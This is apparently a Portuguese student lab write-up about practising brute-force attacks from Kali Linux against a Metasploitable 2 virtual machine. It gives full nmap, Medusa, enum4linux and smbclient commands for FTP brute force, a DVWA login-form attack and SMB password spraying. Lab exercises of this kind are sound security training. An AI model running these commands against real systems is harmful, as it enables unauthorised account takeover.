# Similando-Brutaforce
simulando brute force
Programas utilizados: 
Vm = Virtual Box Oracle
OS = Kali Linux e Metasploitable 2

Força Bruta em FTP
1 -  verificar o ip de rede (ipconfig) , verificado o ip da rede, vamos “pinga” a maquina que esta conectada a nossa rede (ping -c 3 IP), -c 3 – quantidades de pacotes de verificação se esta conectado a outra máquina.
2 – Verificar quais serviços estão disponíveis para ataque
Utilizando o Nmap, procuramos as portas (21,22,80,139 e 445) através do comando (nmap -sV -p 21 22 80 139 445 “+ IP alvo”) que são as portas utilizadas para o ataque, após o scanner verificamos as portas abertas e suas versões
3 – Verificando porta aberta
Porta alvo aberta (21 - FTP), utilizamos o comando (ftp IP alvo) recebendo mensagem de conectado sabemos que o serviço realmente está ativo.
4 -   sabendo que ela esta ativa, se pede senha e login para isso utilizando o comando ( echo -e ‘user\nmsfadmin\nadmin\nroot’ > users.txt ) para criar uma lista com possíveis nomes de usuários “login” e também o comando para senhas ( echo -e “123456\npassword\nqwerty\nmsfadmin” > pass.txt )
5 –  usando o comando ( medusa -h IP Alvo -U user.txt -P pass.txt -M ftp -t 6 ), assim que ele terminar devemos procurar “Sucess” onde são o login e senha valida
6 – voltando ao comando ftp + IP Alvo para acessar o login e senha, colocamos as que obtivemos no passo anterior, assim conseguimos entrar no sistema ftp do alvo. 


Formulário WEB
1 – Colocando o ip alvo anterior em uma pagina no seguinte comando: 192.168.56.101/dvwa/login.php 
2 – Abrindo a aba de desenvolvedor no navegador, vamos na aba Network para visualizar o que o navegador envia e recebe durante a ação, colocando um login e senha aleatórias vemos que o login falhou porem na aba Network nos mostra o username, password e o login errados assim sabemos quais parâmetros precisamos.
3 – agora precisamos criar wordlists, o mesmo da etapa 4 de brute force,


4 – usando o comando: 
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M http \
-m Page: ‘/dvwa/login.php’ \
-m Form: ‘username=^USER^&password=^PASS^&Login=Login’ \
-m ‘FAIL=Login failed’ -t 6
Novamente obtendo algum “SUCESS” temos o login e senha.


Password spraying em SMB

1 – enumeração de usuários: 
Usando o comando enum4linux -a 192.168.56.101 | tee enum4_output.txt
2 – após mostrar varias informações, usamos o comando:
Less enum4_output.txt
Para acessa o arquivo gerado
3 – criando uma wordlist
Usando o comando: 
Echo – e “user\nmsfadmin\nservice” > smb_users.txt 
Esse arquivo vai alimentar a ferramenta de ataque
4 – criando uma lista de senhas
Echo -e “password\n123456\nWelcome123\nmsfadmin” > senhas_spray.txt
5 -  ataque com medusa
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
aparecendo uma lista de informações, quando visualizar “ACCOUNT FOUND” significa que teve acesso ao sistema
6 – usando outro comando:
Smbclient -L //192.168.56.101 -U msadmin
Para verificar se realmente teve acesso, logo pedira uma senha e colocando “msfadmin” (senha descoberta), terá acesso ao sistema
